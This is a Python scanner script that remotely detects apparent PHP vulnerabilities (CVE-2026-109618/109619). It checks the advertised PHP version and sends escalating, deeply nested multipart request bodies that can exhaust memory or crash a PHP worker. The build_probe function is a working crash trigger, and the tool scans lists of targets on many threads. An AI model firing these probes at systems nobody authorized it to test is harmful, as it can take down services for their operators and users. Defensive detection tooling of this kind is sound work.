#!/usr/bin/env python3
"""
php2shell remote detector — CVE-2026-109618 / CVE-2026-109619

High-fidelity REMOTE detection without exploitation. It does NOT attempt code
execution. It (1) checks the advertised PHP version, then (2) sends escalating
deeply-nested multipart probes and reads how the server reacts (in-band PHP
memory-exhaustion fatal, empty 500, or a dead FPM/worker).

Methodology follows Assetnote's php2shell-scanner; original research by the
Calif team (https://calif.io/php2shell/).

*** AUTHORIZED TESTING ONLY ***
The probe is designed to drive the vulnerable code into a memory-exhaustion
error, so it can transiently spike memory or fail a PHP worker. Run it only
against systems you own or are explicitly authorized to test. Do not mass-scan
third parties.

Fixed versions: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. Branches <= 8.1 are EOL.
"""
from __future__ import annotations
import argparse, json, re, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.exceptions import ConnectionError as ReqConnError, ReadTimeout, ChunkedEncodingError
except ImportError:
    sys.exit("pip install requests  (see requirements.txt)")

requests.packages.urllib3.disable_warnings()  # for -k

FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
NESTED_KEYS = 62
# (size_MiB, parts) — escalate; stop as soon as a verdict is settled
PROBES = [(1, 64), (6, 256), (20, 512)]
FATAL_RE = re.compile(rb"Allowed memory size of \d+ bytes exhausted")
VER_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)


def build_probe(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError("probe too small for parts")
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def version_verdict(powered_by: str):
    m = VER_RE.search(powered_by or "")
    if not m:
        return None  # version hidden
    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    branch = f"{major}.{minor}"
    if branch not in FIXED:
        if (major, minor) <= (8, 1):
            return ("VULNERABLE", f"advertised PHP {major}.{minor}.{patch} is EOL (no fix)")
        return None
    if patch >= FIXED[branch]:
        return ("NOT_VULNERABLE", f"advertised PHP {branch}.{patch} >= {branch}.{FIXED[branch]}")
    return ("VULNERABLE", f"advertised PHP {branch}.{patch} < {branch}.{FIXED[branch]}")


def send(session, method, url, headers, data, timeout, verify):
    return session.request(method, url, headers=headers, data=data,
                           timeout=timeout, verify=verify, allow_redirects=False, stream=False)


def scan_one(url, path, timeout, verify, extra_headers, max_mib):
    target = url.rstrip("/") + path
    out = {"url": target, "verdict": "NOT_VULNERABLE", "reason": "", "version": None}
    base_headers = {"User-Agent": "php2shell-check/1.0", "Connection": "close"}
    base_headers.update(extra_headers)

    with requests.Session() as s:
        # 0) version check (zero impact)
        try:
            r0 = send(s, "GET", target, base_headers, None, timeout, verify)
            pb = r0.headers.get("X-Powered-By", "") or r0.headers.get("Server", "")
            out["version"] = pb or None
            vv = version_verdict(pb)
            if vv:
                out["verdict"], out["reason"] = vv[0], vv[1]
                if vv[0] == "VULNERABLE":
                    return out  # advertised-unpatched is enough
        except Exception as e:
            out["reason"] = f"version probe error: {e}"

        # 1) control request (tiny) to establish a baseline body
        ct = {"Content-Type": "multipart/form-data; boundary="}
        ch = {**base_headers, **ct}
        try:
            ctrl = send(s, "POST", target, ch, b"--\nx:\n--", timeout, verify)
            ctrl_has_body = len(ctrl.content) > 0
            ctrl_code = ctrl.status_code
        except Exception as e:
            out["verdict"] = "INCONCLUSIVE"; out["reason"] = f"control failed: {e}"; return out
        if ctrl_code >= 500:
            out["verdict"] = "INCONCLUSIVE"; out["reason"] = f"control returned {ctrl_code}"; return out

        # 2) escalating probes; stop on first positive
        for size_mib, parts in PROBES:
            if size_mib > max_mib:
                break
            body = build_probe(size_mib, parts)
            try:
                pr = send(s, "POST", target, ch, body, timeout, verify)
            except (ReqConnError, ReadTimeout, ChunkedEncodingError) as e:
                out["verdict"] = "VULNERABLE"
                out["reason"] = f"connection dropped mid/post-probe at {size_mib}MiB (worker died): {type(e).__name__}"
                return out
            except Exception as e:
                out["reason"] = f"probe error at {size_mib}MiB: {e}"; continue

            b = pr.content
            if FATAL_RE.search(b):
                out["verdict"] = "VULNERABLE"
                out["reason"] = f"in-band PHP memory-exhaustion fatal at {size_mib}MiB"; return out
            if pr.status_code == 500 and ctrl_has_body and not b:
                out["verdict"] = "VULNERABLE"
                out["reason"] = f"empty HTTP 500 at {size_mib}MiB (control had a body)"; return out
            if pr.status_code in (502, 503, 504):
                out["verdict"] = "VULNERABLE"
                out["reason"] = f"HTTP {pr.status_code} at {size_mib}MiB (worker died mid-request)"; return out
            if pr.status_code == 200 and ctrl_has_body and not b:
                out["verdict"] = "VULNERABLE"
                out["reason"] = f"empty 200 at {size_mib}MiB (worker died mid-request)"; return out

        if out["verdict"] == "NOT_VULNERABLE" and not out["reason"]:
            out["reason"] = "no crash signal across probes; no unpatched version advertised"
    return out


def main():
    ap = argparse.ArgumentParser(description="php2shell remote detector (authorized use only)")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url")
    g.add_argument("-l", "--list", help="file of URLs, one per line")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("-t", "--threads", type=int, default=10)
    ap.add_argument("--timeout", type=float, default=60)
    ap.add_argument("--max-mib", type=int, default=20, help="cap probe size (default 20; lower = less impact)")
    ap.add_argument("-k", "--insecure", action="store_true")
    ap.add_argument("-H", "--header", action="append", default=[], help="Name: Value (repeatable)")
    ap.add_argument("-o", "--output", help="write JSON results")
    ap.add_argument("-q", "--quiet", action="store_true", help="print only VULNERABLE")
    args = ap.parse_args()

    extra = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1); extra[k.strip()] = v.strip()

    targets = [args.url] if args.url else [l.strip() for l in open(args.list) if l.strip()]
    targets = [t if "://" in t else "https://" + t for t in targets]

    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(scan_one, t, args.path, args.timeout, not args.insecure, extra, args.max_mib): t
                for t in targets}
        for f in as_completed(futs):
            r = f.result(); results.append(r)
            if args.quiet and r["verdict"] != "VULNERABLE":
                continue
            tag = {"VULNERABLE": "[VULN]", "NOT_VULNERABLE": "[ok]",
                   "INCONCLUSIVE": "[??]"}.get(r["verdict"], "[?]")
            print(f"{tag}\t{r['url']}\t{r['verdict']}\t{r['reason']}")

    if args.output:
        json.dump(results, open(args.output, "w"), indent=2)
        print(f"\nwrote {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
